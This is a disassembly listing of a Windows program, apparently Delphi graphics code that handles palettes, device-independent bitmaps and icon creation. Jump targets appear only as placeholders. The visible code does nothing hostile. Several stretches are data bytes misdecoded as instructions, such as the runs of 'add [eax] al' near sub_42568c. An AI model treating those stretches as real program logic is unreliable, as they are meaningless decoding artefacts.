mov eax esp
call sub_42481c
test al al
jne r-xdata
mov eax esp
push eax
call CreatePalette
mov esi eax
sub_424958
push ebx
push esi
push edi
push ecx
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
mov [ esp ] eax
test ebx ebx
je r-xdata
mov eax [ esp ]
pop edx
pop edi
pop esi
pop ebx
retn
push esp
push 0x4
push ebx
call GetObjectA
test eax eax
je r-xdata
cmp [ esp ] 0x0
je r-xdata
lea eax [ edi + 0x1 ]
cmp eax [ esp ]
jge r-xdata
push esi
mov eax [ esp + 0x4 ]
push eax
push 0x0
push ebx
call GetPaletteEntries
mov eax esi
mov edx [ esp ]
call sub_4246ac
mov [ esp ] eax
sub_4249ac
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
shr [ eax + 0x8 ] 0x1
mov edx [ ebp - 0x4 ]
movzx edx [ edx + 0xe ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov ecx 0x20
call sub_424354
mov edx [ ebp - 0x4 ]
imul [ edx + 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov ax [ eax + 0xe ]
call sub_424334
mov esi eax
push 0x0
call GetDC
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
xor edx edx
push ebp
push sub_424b58
push [ fs : edx ]
mov [ fs : edx ] esp
mov edi [ ebp - 0x4 ]
mov eax edi
add eax 0x28
mov edx esi
shl edx 0x2
add eax edx
mov [ ebp - 0x14 ] eax
push 0x0
mov eax [ ebp - 0x4 ]
push edi
mov eax [ ebp - 0x14 ]
push eax
push 0x4
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call CreateDIBitmap
call sub_4241c4
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_424a7e
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp + 0x8 ]
xor ecx ecx
mov eax [ ebp - 0xc ]
call sub_4241d4
mov [ ebx ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_424a85
mov eax [ ebp - 0xc ]
push eax
call DeleteObject
retn
call sub_4240c8
sub_424a85
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
add [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov bx 0x1
mov [ eax + 0xe ] bx
mov eax [ ebp - 0x4 ]
movzx edx bx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov ecx 0x20
call sub_424354
mov edx [ ebp - 0x4 ]
imul [ edx + 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x20 ] 0x2
mov eax [ ebp - 0x4 ]
mov [ eax + 0x24 ] 0x2
mov eax [ ebp - 0x4 ]
add eax 0x28
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] 0xffffff
push 0x0
mov ebx [ ebp - 0x4 ]
push ebx
mov eax [ ebp - 0x14 ]
push eax
push 0x4
mov eax [ ebp - 0x4 ]
push ebx
mov eax [ ebp - 0x10 ]
push eax
call CreateDIBitmap
call sub_4241c4
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_424b38
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp + 0x8 ]
mov cl 0x1
mov eax [ ebp - 0xc ]
call sub_4241d4
mov edx [ ebp - 0x8 ]
mov [ edx ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_424b3f
mov eax [ ebp - 0xc ]
push eax
call DeleteObject
retn
sub_424b74
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor ecx ecx
mov cl [ edx ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov eax [ eax ]
sub ecx eax
xor ebx ebx
mov bl [ edx + 0x1 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x8 ]
sub ebx [ edx + 0x4 ]
mov esi [ ebp - 0x4 ]
movzx esi [ esi ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x8 ]
sub esi eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x1 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x8 ]
sub eax [ edx + 0x4 ]
mov [ ebp - 0x8 ] eax
mov eax ecx
cdq
xor eax edx
sub eax edx
mov edi eax
mov eax esi
cdq
xor eax edx
sub eax edx
cmp edi eax
jg r-xdata
xor eax eax
jmp r-xdata
test ecx ecx
jle r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax ebx
cdq
xor eax edx
sub eax edx
mov ecx eax
mov eax [ ebp - 0x8 ]
cdq
xor eax edx
sub eax edx
cmp ecx eax
jg r-xdata
cmp esi ecx
jl r-xdata
test ebx ebx
jle r-xdata
mov al 0x1
cmp ebx [ ebp - 0x8 ]
jle r-xdata
sub_424c04
push ebp
mov ebp esp
add esp 0xffffff90
push ebx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0xc ]
mov eax [ ebp - 0xc ]
shl eax 0x4
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
call sub_407e6c
mov [ ebp - 0x10 ] eax
xor edx edx
push ebp
push sub_424efb
push [ fs : edx ]
mov [ fs : edx ] esp
mov edx [ ebp - 0x10 ]
mov ecx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebx ]
or eax [ ebx + 0x4 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebx ]
mov [ eax ] edx
mov edx [ ebx + 0x4 ]
mov [ eax + 0x4 ] edx
push 0xb
call GetSystemMetrics
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
push 0xc
call GetSystemMetrics
mov edx [ ebp + 0x8 ]
mov [ edx + 0x4 ] eax
jmp r-xdata
xor edx edx
push ebp
push sub_424ced
push [ fs : edx ]
mov [ fs : edx ] esp
push 0xe
mov eax [ ebp - 0x28 ]
push eax
call GetDeviceCaps
mov ebx eax
push 0xc
mov eax [ ebp - 0x28 ]
push eax
call GetDeviceCaps
imul bx ax
mov eax ebx
cmp ax 0x8
jbe r-xdata
call sub_4240c8
push 0x0
call GetDC
mov [ ebp - 0x28 ] eax
cmp [ ebp - 0x28 ] 0x0
jne r-xdata
mov ecx eax
mov eax 0x1
shl eax cl
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x1c ] 0x7fffffff
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_424cf4
mov eax [ ebp - 0x28 ]
push eax
push 0x0
call ReleaseDC
retn
sub_424cf4
xor eax eax
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x10 ]
movzx eax [ eax + 0x2 ]
call sub_424b68
mov [ ebp - 0x20 ] eax
mov edi [ ebp - 0xc ]
dec edi
test edi edi
jle r-xdata
mov eax [ ebp - 0x24 ]
add eax eax
mov edx [ ebp - 0x10 ]
lea eax [ edx + eax * 8 ]
mov [ ebp - 0x40 ] eax
mov eax [ ebp - 0x40 ]
movzx eax [ eax ]
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
mov eax [ ebp - 0x40 ]
movzx eax [ eax + 0x1 ]
mov edx [ ebp + 0x8 ]
mov [ edx + 0x4 ] eax
mov eax [ ebp - 0x40 ]
mov eax [ eax + 0x8 ]
call sub_407e6c
mov [ ebp - 0x2c ] eax
xor eax eax
push ebp
push sub_424edb
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x40 ]
mov edx [ eax + 0xc ]
mov eax [ ebp - 0x14 ]
add eax [ ebp + 0x10 ]
sub edx eax
mov cx 0x1
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x14 ]
mov eax [ ebp - 0x40 ]
mov ecx [ eax + 0x8 ]
mov ebx [ ebp - 0x2c ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0x38 ]
lea edx [ ebp - 0x34 ]
mov eax ebx
call sub_4249ac
lea eax [ ebp - 0x70 ]
push eax
push 0x18
mov eax [ ebp - 0x38 ]
push eax
call GetObjectA
lea eax [ ebp - 0x58 ]
push eax
push 0x18
mov eax [ ebp - 0x34 ]
push eax
call GetObjectA
mov ebx [ ebp - 0x64 ]
imul ebx [ ebp - 0x68 ]
movzx eax [ ebp - 0x60 ]
imul ebx eax
mov eax [ ebp - 0x4c ]
imul [ ebp - 0x50 ]
movzx edx [ ebp - 0x48 ]
imul edx
mov [ ebp - 0x3c ] eax
mov eax [ ebp - 0x3c ]
add eax ebx
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x18 ]
call sub_407e6c
mov [ ebp - 0x30 ] eax
xor eax eax
push ebp
push sub_424eb8
push [ fs : eax ]
mov [ fs : eax ] esp
mov edi [ ebp - 0x30 ]
mov esi [ ebp - 0x30 ]
add esi ebx
push edi
push ebx
mov eax [ ebp - 0x38 ]
push eax
call GetBitmapBits
push esi
mov eax [ ebp - 0x3c ]
push eax
mov eax [ ebp - 0x34 ]
push eax
call GetBitmapBits
mov eax [ ebp - 0x34 ]
push eax
call DeleteObject
mov eax [ ebp - 0x38 ]
push eax
call DeleteObject
push esi
push edi
mov al [ ebp - 0x46 ]
push eax
mov al [ ebp - 0x48 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
push eax
mov eax [ rw-data ]
push eax
call CreateIcon
mov edx [ ebp - 0x8 ]
mov [ edx ] eax
mov eax [ ebp - 0x8 ]
cmp [ eax ] 0x0
jne r-xdata
mov esi 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_424ebf
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0x30 ]
call sub_4027ac
retn
call sub_42411c
inc esi
dec edi
jne r-xdata
cmp ebx [ ebp - 0x20 ]
jl r-xdata
mov eax esi
add eax eax
mov edx [ ebp - 0x10 ]
movzx eax [ edx + eax * 8 + 0x2 ]
call sub_424b68
mov ebx eax
cmp ebx [ ebp - 0x1c ]
jg r-xdata
push ebp
mov eax esi
add eax eax
mov edx [ ebp - 0x10 ]
lea edx [ edx + eax * 8 ]
mov eax [ ebp - 0x24 ]
add eax eax
mov ecx [ ebp - 0x10 ]
lea eax [ ecx + eax * 8 ]
call sub_424b74
pop ecx
test al al
je r-xdata
mov [ ebp - 0x24 ] esi
mov [ ebp - 0x20 ] ebx
sub_424f24
push ebx
push esi
push edi
add esp 0xffffffac
mov esi ecx
mov ebx edx
xor edx edx
mov [ esp + 0x18 ] edx
push esp
push 0x54
push eax
call GetObjectA
test eax eax
jne r-xdata
cmp eax 0x40
jl r-xdata
call sub_4240a4
jmp r-xdata
mov eax ebx
xor ecx ecx
mov edx 0x28
call sub_402c30
mov [ ebx ] 0x28
mov eax [ esp + 0x4 ]
mov [ ebx + 0x4 ] eax
mov eax [ esp + 0x8 ]
mov [ ebx + 0x8 ] eax
cmp [ esp + 0x18 ] 0x28
jb r-xdata
mov eax esi
sub eax 0x2
je r-xdata
mov [ ebx + 0xe ] 0x1
jmp r-xdata
dec eax
sub eax 0xe
jb r-xdata
push esi
mov edi ebx
lea esi [ esp + 0x1c ]
mov ecx 0xa
[ edi ] [ esi ]
pop esi
jmp r-xdata
mov [ ebx + 0xc ] 0x1
mov eax [ ebx + 0x20 ]
cmp eax [ ebx + 0x24 ]
jae r-xdata
mov [ ebx + 0xe ] 0x4
mov [ ebx + 0x20 ] esi
jmp r-xdata
sub eax 0xf0
jb r-xdata
cmp [ ebx + 0x14 ] 0x0
jne r-xdata
mov [ ebx + 0x24 ] eax
mov [ ebx + 0xe ] 0x8
mov [ ebx + 0x20 ] esi
jmp r-xdata
jmp r-xdata
add esp 0x54
pop edi
pop esi
pop ebx
retn
movzx edx [ ebx + 0xe ]
mov eax [ ebx + 0x4 ]
mov ecx 0x20
call sub_424354
mov ecx eax
mov eax [ ebx + 0x8 ]
cdq
xor eax edx
sub eax edx
imul ecx eax
mov [ ebx + 0x14 ] ecx
mov ax [ esp + 0x12 ]
imul [ esp + 0x10 ]
mov [ ebx + 0xe ] ax
sub_425008
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
mov esi ecx
mov ebx edx
lea edx [ ebp - 0x28 ]
mov ecx [ ebp + 0x8 ]
call sub_424f24
mov ax [ ebp - 0x1a ]
cmp ax 0x8
jbe r-xdata
mov edx [ ebp - 0x8 ]
test edx edx
jne r-xdata
mov [ ebx ] 0x28
test [ ebp - 0x18 ] 0x3
je r-xdata
mov eax edx
shl eax 0x2
add eax 0x28
mov [ ebx ] eax
mov ecx eax
mov eax 0x1
shl eax cl
shl eax 0x2
add eax 0x28
mov [ ebx ] eax
jmp r-xdata
mov eax [ ebp - 0x14 ]
mov [ esi ] eax
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
add [ ebx ] 0xc
jmp r-xdata
sub_425074
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov edx ebx
mov ecx [ ebp + 0x8 ]
mov eax esi
call sub_424f24
xor eax eax
mov [ ebp - 0x8 ] eax
push 0x0
call CreateCompatibleDC
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_425111
push [ fs : eax ]
mov [ fs : eax ] esp
test edi edi
je r-xdata
push 0x0
push ebx
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebx + 0x8 ]
push eax
push 0x0
push esi
mov eax [ ebp - 0xc ]
push eax
call GetDIBits
test eax eax
setne [ ebp - 0x1 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_425118
cmp [ ebp - 0x8 ] 0x0
je r-xdata
push 0x0
push edi
mov eax [ ebp - 0xc ]
push eax
call SelectPalette
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0xc ]
push eax
call RealizePalette
mov eax [ ebp - 0xc ]
push eax
call DeleteDC
retn
push 0x0
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call SelectPalette
sub_425148
push ebp
mov ebp esp
add esp 0xffffffac
push ebx
push esi
push edi
mov [ ebp - 0x1 ] cl
mov esi edx
mov ebx eax
lea eax [ ebp - 0x2a ]
xor ecx ecx
mov edx 0x6
call sub_402c30
lea eax [ ebp - 0x54 ]
xor ecx ecx
mov edx 0x10
call sub_402c30
lea eax [ ebp - 0x44 ]
push eax
push esi
call GetIconInfo
call sub_42513c
xor edx edx
push ebp
push sub_425336
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x2
lea ecx [ ebp - 0x10 ]
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x38 ]
call sub_425008
push 0x10
lea ecx [ ebp - 0x14 ]
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x34 ]
call sub_425008
xor eax eax
mov [ ebp - 0x18 ] eax
xor eax eax
mov [ ebp - 0x1c ] eax
xor eax eax
mov [ ebp - 0x20 ] eax
xor eax eax
mov [ ebp - 0x24 ] eax
xor edx edx
push ebp
push sub_42530f
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x8 ]
call sub_407e6c
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x10 ]
call sub_407e6c
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0xc ]
call sub_407e6c
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x14 ]
call sub_407e6c
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x1c ]
push eax
push 0x2
mov ecx [ ebp - 0x18 ]
xor edx edx
mov eax [ ebp - 0x38 ]
call sub_425074
mov eax [ ebp - 0x24 ]
push eax
push 0x10
mov ecx [ ebp - 0x20 ]
xor edx edx
mov eax [ ebp - 0x34 ]
call sub_425074
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov [ ebp - 0x28 ] 0x1
mov [ ebp - 0x26 ] 0x1
lea edx [ ebp - 0x2a ]
mov ecx 0x6
mov eax ebx
mov esi [ eax ]
call [ esi + 0x10 ]
mov esi [ ebp - 0x20 ]
mov eax esi
mov dl [ eax + 0x4 ]
mov [ ebp - 0x54 ] dl
mov dl [ eax + 0x8 ]
mov [ ebp - 0x53 ] dl
mov dx [ eax + 0xc ]
imul dx [ eax + 0xe ]
mov [ ebp - 0x52 ] dx
mov eax [ ebp - 0xc ]
add eax [ ebp - 0x14 ]
add eax [ ebp - 0x10 ]
mov [ ebp - 0x4c ] eax
mov [ ebp - 0x48 ] 0x16
lea edx [ ebp - 0x54 ]
mov ecx 0x10
mov eax ebx
mov edi [ eax ]
call [ edi + 0x10 ]
mov eax esi
mov edx [ eax + 0x8 ]
add [ eax + 0x8 ] edx
mov edx [ ebp - 0x20 ]
mov ecx [ ebp - 0xc ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x10 ]
mov edx [ ebp - 0x24 ]
mov ecx [ ebp - 0x14 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x10 ]
mov edx [ ebp - 0x1c ]
mov ecx [ ebp - 0x10 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x10 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_425316
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x20 ]
call sub_4027ac
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x24 ]
call sub_4027ac
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x18 ]
call sub_4027ac
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x1c ]
call sub_4027ac
retn
mov eax [ ebp - 0xc ]
add eax 0x16
add eax [ ebp - 0x14 ]
add eax [ ebp - 0x10 ]
mov [ ebp - 0x30 ] eax
lea edx [ ebp - 0x30 ]
mov ecx 0x4
mov eax ebx
mov esi [ eax ]
call [ esi + 0x10 ]
sub_425316
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42533d
mov eax [ ebp - 0x34 ]
push eax
call DeleteObject
mov eax [ ebp - 0x38 ]
push eax
call DeleteObject
retn
sub_425344
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4031ec
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403540
mov eax esi
pop esi
pop ebx
retn
call sub_403598
pop [ fs : 0x0 ]
add esp 0xc
sub_425394
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax ]
call [ edx + 0x1c ]
xor al 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ebx [ eax + 0x20 ]
mov eax ebx
mov edx [ r-xdata ]
call sub_4033a8
test al al
je r-xdata
mov al 0x1
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov edx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
test al al
je r-xdata
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn
sub_4253ec
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x30 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x44 ]
push eax
push ebp
call sub_425394
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x8 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_425435
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi edx
mov ebx eax
test esi esi
je r-xdata
xor eax eax
jmp r-xdata
mov eax ebx
call sub_403164
mov edi eax
mov eax esi
call sub_403164
cmp edi eax
je r-xdata
mov [ ebp - 0x1 ] al
mov eax ebx
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov al 0x1
mov eax ebx
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov [ ebp - 0x1 ] al
jmp r-xdata
mov al 0x1
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031ec
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_42556f
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x8 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031ec
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_425552
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0xc ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx ]
cmp edx [ esp + 0x4 ]
jne r-xdata
pop edx
pop eax
jne r-xdata
cmp eax [ esp ]
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x4 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
call sub_407f98
test al al
jne r-xdata
mov [ ebp - 0x1 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_425559
mov al 0x1
sub_425588
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
push 0x20
mov ecx edx
mov eax [ r-xdata ]
mov dl 0x1
call sub_41c290
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4255d0
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x54 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4255d7
mov eax [ ebp - 0x4 ]
call sub_40321c
retn
sub_4255dc
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x1a ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x10
mov bl [ ebp + 0x14 ]
push ebx
mov bl [ ebp + 0x10 ]
push ebx
mov ebx [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x8 ]
push ebx
mov ebx eax
mov eax [ ebx + 0x1c ]
call [ ebx + 0x18 ]
sub_425610
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
push 0xffff
mov ecx edx
mov eax [ r-xdata ]
mov dl 0x1
call sub_41c290
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_42565b
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x58 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_425662
mov eax [ ebp - 0x4 ]
call sub_40321c
retn
sub_42568c
push cs
or edx [ esi + eax * 2 + 0x69 ]
insb
inc esi
outsd
jb r-xdata
lodsb [ esi ]
mov [ 0xffffffffa0740041 ] eax
inc ecx
popad
je r-xdata
dec ebp
clc
dec esp
imul esi [ ebx + 0x74 ] 0x5500408d
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
test dl dl
je r-xdata
add al dh
mov al [ 0x54100041 ]
inc esi
imul ebp [ ebp + 0x46 ] 0x616d726f
je r-xdata
adc [ eax ] al
or [ eax ] al
add [ eax ] al
lea eax [ eax ]
add [ edi + 0x42 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dl
push edi
inc edx
add [ eax ] dl
add [ eax ] al
add [ esi + edi * 2 ] dh
inc ecx
add [ esp + esi + 0x40 ] ah
add [ eax + 0x34 ] dh
inc eax
add [ esp + esi + 0x40 ] dh
add [ eax + 0x34 ] bh
inc eax
add [ esp + esi + 0x40 ] ch
add [ ecx + esi + 0x31d00040 ] dh
inc eax
add [ eax + 0x58 ] bl
inc edx
add ah al
mov eax [ 0xffffffffa3ac0041 ]
inc ecx
add [ eax + 0x41 ] dh
add [ eax ] al
add [ edx ] al
add [ eax ] al
add ah cl
adc [ eax ] al
add al 0x0
add [ eax ] al
int3
mov edx r-xdata
mov eax esi
call sub_4258a4
push 0x0
mov eax [ r-xdata ]
push eax
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405e60
mov ecx [ ebp - 0xc ]
mov edx r-xdata
mov eax esi
call sub_4258a4
push 0x0
mov eax [ r-xdata ]
push eax
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405e60
mov ecx [ ebp - 0x10 ]
mov edx r-xdata
mov eax esi
call sub_4258a4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_425808
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_403f90
retn
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_425801
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
mov eax esi
call sub_4031ec
push 0x0
mov eax [ r-xdata ]
push eax
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405e60
mov ecx [ ebp - 0x4 ]
mov edx r-xdata
mov eax esi
call sub_4258a4
push 0x0
mov eax [ r-xdata ]
push eax
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405e60
mov ecx [ ebp - 0x8 ]
add esp 0xfffffff0
call sub_403540
sub_425724
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_425801
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
mov eax esi
call sub_4031ec
push 0x0
mov eax [ r-xdata ]
push eax
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405e60
mov ecx [ ebp - 0x4 ]
mov edx r-xdata
mov eax esi
call sub_4258a4
push 0x0
mov eax [ r-xdata ]
push eax
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405e60
mov ecx [ ebp - 0x8 ]
mov edx r-xdata
mov eax esi
call sub_4258a4
push 0x0
mov eax [ r-xdata ]
push eax
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405e60
mov ecx [ ebp - 0xc ]
mov edx r-xdata
mov eax esi
call sub_4258a4
push 0x0
mov eax [ r-xdata ]
push eax
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405e60
mov ecx [ ebp - 0x10 ]
mov edx r-xdata
mov eax esi
call sub_4258a4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_425808
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_403f90
retn
add esp 0xfffffff0
call sub_403540
sub_4258a4
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
xor eax eax
push ebp
push sub_425927
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ r-xdata ]
mov eax 0x10
call sub_404d40
mov esi eax
mov ebx esi
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_408064
mov edx [ ebp - 0xc ]
lea eax [ ebx + 0x4 ]
call sub_403fc0
mov eax [ ebp + 0x8 ]
mov [ ebx ] eax
lea eax [ ebx + 0x8 ]
mov edx [ ebp - 0x8 ]
call sub_403fc0
mov eax [ ebp + 0xc ]
mov [ ebx + 0xc ] eax
mov edx esi
mov eax edi
call sub_41a040
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42592e
lea eax [ ebp - 0xc ]
call sub_403f6c
retn
sub_425938
push ebp
mov ebp esp
add esp 0xfffffef8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
xor eax eax
push ebp
push sub_4259b6
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ edi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor esi esi
mov edx ebx
mov eax edi
call sub_41a19c
mov esi [ eax ]
lea edx [ ebp - 0x108 ]
mov eax esi
call sub_40316c
lea edx [ ebp - 0x108 ]
